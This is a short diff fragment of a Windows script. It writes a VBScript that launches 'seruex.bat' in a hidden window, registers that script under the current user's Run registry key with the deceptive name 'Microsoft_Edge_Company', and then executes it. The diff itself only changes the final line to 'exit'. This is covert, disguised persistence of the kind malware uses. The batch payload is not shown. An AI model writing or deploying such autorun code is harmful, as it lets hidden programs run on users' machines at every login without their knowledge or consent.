@@ -7,4 +7,4 @@ goto a
 set objshell = createobject("wscript.shell")
 objshell.run "seruex.bat",vbhide
 "@; add-content "C:\Users\User\Downloads\ser/seruex.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d C:\Users\User\Downloads\ser\seruex.vbs; cd C:\Users\User\Downloads\ser; ./seruex.vbs
-"hola"
+exit
